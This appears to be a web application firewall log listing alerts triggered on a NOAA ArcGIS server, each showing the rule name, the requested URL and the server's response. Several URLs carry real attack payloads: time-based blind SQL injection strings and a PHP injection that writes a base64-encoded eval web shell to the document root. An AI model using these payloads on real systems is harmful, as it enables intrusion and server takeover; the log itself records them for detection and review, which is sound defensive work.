+https://idpgis.ncep.noaa.gov/arcgis/rest/services/NWS_Climate_Outlooks/cpc_wkly_sst/MapServer?f=pjson%27%20aND%20BeNChMaRK%282999999%2CMd5%28NoW%28%29%29%29%20AnD%20%271
+
+
+
+
+
+
+
+
+<html lang="en">
+
+<head>
+<title>
+Error: Output format not supported.</title>
+<link href="/arcgis/rest/static/main.css" rel="stylesheet" type="text/css"/>
+</head>
+
+<body>
+
+<table width="100%" class="userTable">
+<tr>
+<td class="titlecell">ArcGIS REST Framework</td>
+</tr>
+</table>
+<table width="100%" class="navTable">
+<tr valign="top">
+<td class="breadcrumbs">
+<a href="/arcgis/rest/services">Home</a>
+</td>
+</tr>
+</table>
+
+<div class="cbody">
+<br/>
+<br/>
+<b>Error: </b>Output format not supported.<br/>
+
+<b>Code: </b>400<br/><br/>
+
+
+
+
+
+
+
+<div style="color:#ff6666"> 
+
+</div>
+
+</div>
+
+</body>
+
+</html>
+
+
+950007 Blind SQL Injection Attack
+Status = 404
+https://idpgis.ncep.noaa.gov/zabbix/jsrpc.php
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /zabbix/jsrpc.php was not found on this server.</p>
+</body></html>
+
+
+3000017 MySQL Keywords Anomaly Detection Alert
+Status = 400
+https://idpgis.ncep.noaa.gov/arcgis/rest/services/NWS_Climate_Outlooks/cpc_wkly_sst/MapServer?f=pjson%27%26%26BeNChMaRK%282999999%2CmD5%28NOW%28%29%29%29%26%26%271
+
+
+
+
+
+
+
+
+<html lang="en">
+
+<head>
+<title>
+Error: Output format not supported.</title>
+<link href="/arcgis/rest/static/main.css" rel="stylesheet" type="text/css"/>
+</head>
+
+<body>
+
+<table width="100%" class="userTable">
+<tr>
+<td class="titlecell">ArcGIS REST Framework</td>
+</tr>
+</table>
+<table width="100%" class="navTable">
+<tr valign="top">
+<td class="breadcrumbs">
+<a href="/arcgis/rest/services">Home</a>
+</td>
+</tr>
+</table>
+
+<div class="cbody">
+<br/>
+<br/>
+<b>Error: </b>Output format not supported.<br/>
+
+<b>Code: </b>400<br/><br/>
+
+
+
+
+
+
+
+<div style="color:#ff6666"> 
+
+</div>
+
+</div>
+
+</body>
+
+</html>
+
+
+960901 Invalid character in request
+Status = 400
+https://idpgis.ncep.noaa.gov/arcgis/rest/services/NWS_Climate_Outlooks/cpc_wkly_sst/MapServer?f=pjson%00%27%7C%7CSLeeP%283%29%26%26%271
+
+
+
+
+
+
+
+
+<html lang="en">
+
+<head>
+<title>
+Error: Output format not supported.</title>
+<link href="/arcgis/rest/static/main.css" rel="stylesheet" type="text/css"/>
+</head>
+
+<body>
+
+<table width="100%" class="userTable">
+<tr>
+<td class="titlecell">ArcGIS REST Framework</td>
+</tr>
+</table>
+<table width="100%" class="navTable">
+<tr valign="top">
+<td class="breadcrumbs">
+<a href="/arcgis/rest/services">Home</a>
+</td>
+</tr>
+</table>
+
+<div class="cbody">
+<br/>
+<br/>
+<b>Error: </b>Output format not supported.<br/>
+
+<b>Code: </b>400<br/><br/>
+
+
+
+
+
+
+
+<div style="color:#ff6666"> 
+
+</div>
+
+</div>
+
+</body>
+
+</html>
+
+
+950006 system command injection
+Status = 200
+https://idpgis.ncep.noaa.gov/arcgis/services/NWS_Climate_Outlooks/cpc_6_10_day_outlk/MapServer/WmsServer?SERVICE=WMS&VERSION=1.3.0&REQUEST=GetMap&FORMAT=image%2Fpng&TRANSPARENT=true&LAYERS=1&EXCEPTIONS=application%2Fvnd.ogc.se_xml&VIEWPARAMS=mmsi%3A()%3Bjob_id%3A(1269456971925289)%3Bid%3A(23)&WIDTH=256&HEIGHT=256&CRS=EPSG%3A4326&STYLES=&BBOX=28.125%2C-94.21875%2C28.4765625%2C-93.8671875
+‰PNG
+
+   IHDR         \r¨f   sRGBÙÉ,   	pHYs  Ä  Ä•+  IDATxœíÔ1 0€°õo¹“ÑƒD³»hšë àŽ@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@˜@Ø&`þo¿£    IEND®B`‚
+
+973332 IE XSS Filters - Attack Detected
+Status = 200
+https://idpgis.ncep.noaa.gov/arcgis/rest/services/NWS_Observations/ahps_riv_gauges/MapServer/export?bboxSR=4326&layers=show:0&size=256,256&imageSR=3857&format=png&transparent=true&dpi=&f=image&bbox=-80.60943603515625,37.95502661288625,-80.606689453125,37.95286091815649
+�PNG
+
+   IHDR         k�XT   sRGB��,   PLTE���xx�   tRNS @��f   	pHYs  �  ��+   TIDATx���   �����
+                                                                M��    IEND�B`�
+
+973306 Possible XSS Attack Detected - HTML Tag Handler
+Status = 200
+https://idpgis.ncep.noaa.gov/arcgis/rest/services/NWS_Observations/ahps_riv_gauges/MapServer/export?bboxSR=4326&layers=show:0&size=256,256&imageSR=3857&format=png&transparent=true&dpi=&f=image&bbox=-80.60943603515625,37.95502661288625,-80.606689453125,37.95286091815649
+�PNG
+
+   IHDR         k�XT   sRGB��,   PLTE���xx�   tRNS @��f   	pHYs  �  ��+   TIDATx���   �����
+                                                                M��    IEND�B`�
+
+973300 Possible XSS Attack Detected - HTML Tag Handler
+Status = 200
+https://idpgis.ncep.noaa.gov/arcgis/rest/services/NWS_Observations/ahps_riv_gauges/MapServer/export?bboxSR=4326&layers=show:0&size=256,256&imageSR=3857&format=png&transparent=true&dpi=&f=image&bbox=-80.60943603515625,37.95502661288625,-80.606689453125,37.95286091815649
+�PNG
+
+   IHDR         k�XT   sRGB��,   PLTE���xx�   tRNS @��f   	pHYs  �  ��+   TIDATx���   �����
+                                                                M��    IEND�B`�
+
+3000003 php code injection
+Status = 200
+https://idpgis.ncep.noaa.gov/arcgis/rest/services?1=%2540ini_set%2528%2522display_errors%2522%252C%25220%2522%2529%253B%2540set_time_limit%25280%2529%253B%2540set_magic_quotes_runtime%25280%2529%253Becho%2520%2527-%253E%257C%2527%253Bfile_put_contents%2528%2524_SERVER%255B%2527DOCUMENT_ROOT%2527%255D.%2527/webconfig.txt.php%2527%252Cbase64_decode%2528%2527PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%252B%2527%2529%2529%253Becho%2520%2527%257C%253C-%2527%253B
+
+
+
+
+
+
+
+
+
+<html lang="en">
+
+<head>
+<title>Folder: /</title>
+<link href="/arcgis/rest/static/main.css" rel="stylesheet" type="text/css"/>
+</head>
+
+<body>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table width="100%" class="userTable">
+ <tr>
+ <td class="titlecell">
+ ArcGIS REST Services Directory
+ </td>
+ <td align="right">
+   
+      
+        <a href="https://idpgis.ncep.noaa.gov/arcgis/rest/login">Login</a>
+       
+            | <a href="https://idpgis.ncep.noaa.gov/arcgis/tokens/">Get Token</a>
+                  
+      
+   
+ </td>
+ </tr>
+</table>
+<table width="100%" class="navTable">
+<tr valign="top">
+<td class="breadcrumbs">
+<a href="/arcgis/rest/services">Home</a>
+
+
+
+
+
+
+  &gt; <a href="/arcgis/rest/services">services</a>
+  
+</td>
+<td align="right">
+<a href="https://idpgis.ncep.noaa.gov/arcgis/sdk/rest/02ss/02ss00000057000000.htm" target="_blank">Help</a> | <a href="https://idpgis.ncep.noaa.gov/arcgis/rest/services?f=help" target="_blank">API Reference</a>
+</td>
+</tr>
+</table>
+
+
+  <table>
+  <tr>
+  <td class="apiref">
+  
+    
+    <a href="?f=pjson" target="_blank">JSON</a>
+    
+     | 
+    <a href="https://idpgis.ncep.noaa.gov/arcgis/services?wsdl" >SOAP</a>
+    
+  </td>
+  </tr>
+  </table>
+  
+
+<h2>Folder: /</h2>
+
+<div class="rbody">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<b>Current Version: </b>10.5
+<br/><br/>
+    <b>View Footprints In:</b>
+          &nbsp;&nbsp;<a href="http://www.arcgis.com/home/webmap/viewer.html?featurecollection=https%3A%2F%2Fidpgis.ncep.noaa.gov%2Farcgis%2Frest%2Fservices%3Ff%3Djson%26option%3Dfootprints&supportsProjection=true&supportsJSONP=true" target="_blank">ArcGIS Online map viewer</a>
+    <br/><br/>
+
+
+ <b>Folders: </b>
+ <ul>
+ 
+	 <li><a href="/arcgis/rest/services/DamageAssessmentToolkit">DamageAssessmentToolkit</a></li>
+	
+	 <li><a href="/arcgis/rest/services/NMFS">NMFS</a></li>
+	
+	 <li><a href="/arcgis/rest/services/NOAA">NOAA</a></li>
+	
+	 <li><a href="/arcgis/rest/services/NOS">NOS</a></li>
+	
+	 <li><a href="/arcgis/rest/services/NOS_Biogeo_Biomapper">NOS_Biogeo_Biomapper</a></li>
+	
+	 <li><a href="/arcgis/rest/services/NOS_ESI">NOS_ESI</a></li>
+	
+	 <li><a href="/arcgis/rest/services/NOS_Observations">NOS_Observations</a></li>
+	
+	 <li><a href="/arcgis/rest/services/NWS">NWS</a></li>
+	
+	 <li><a href="/arcgis/rest/services/NWS_Climate_Outlooks">NWS_Climate_Outlooks</a></li>
+	
+	 <li><a href="/arcgis/rest/services/NWS_Forecasts_Guidance_Warnings">NWS_Forecasts_Guidance_Warnings</a></li>
+	
+	 <li><a href="/arcgis/rest/services/NWS_Observations">NWS_Observations</a></li>
+	
+	 <li><a href="/arcgis/rest/services/NWS_Tropical">NWS_Tropical</a></li>
+	
+	 <li><a href="/arcgis/rest/services/radar">radar</a></li>
+	
+	 <li><a href="/arcgis/rest/services/Utilities">Utilities</a></li>
+	
+ </ul>
+
+
+<b>Services: </b>
+<ul>
+
+  <i>None</i>
+  
+</ul>
+<br/><br/>
+
+<b>Supported Interfaces:</b>
+  &nbsp;&nbsp;<a target="_blank" href="https://idpgis.ncep.noaa.gov/arcgis/rest/services/?f=pjson">REST</a>
+
+  &nbsp;&nbsp;<a target="_blank" href="https://idpgis.ncep.noaa.gov/arcgis/services?wsdl">SOAP</a>
+
+  &nbsp;&nbsp;<a target="_blank" href="https://idpgis.ncep.noaa.gov/arcgis/rest/services/?f=sitemap">Sitemap</a>
+  &nbsp;&nbsp;<a target="_blank" href="https://idpgis.ncep.noaa.gov/arcgis/rest/services/?f=geositemap">Geo Sitemap</a>
+<br/><br/>
+
+</div>
+
+<br/><br/>
+
+</body>
+
+</html>
+
+
+950117 Remote File Inclusion Attack (Remote URL with IP address)
+Status = 503
+https://idpgis.ncep.noaa.gov/arcgis/tokens/generateToken
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>503 Service Temporarily Unavailable</title>
+</head><body>
+<h1>Service Temporarily Unavailable</h1>
+<p>The server is temporarily unable to service your
+request due to maintenance downtime or capacity
+problems. Please try again later.</p>
+</body></html>
+
+
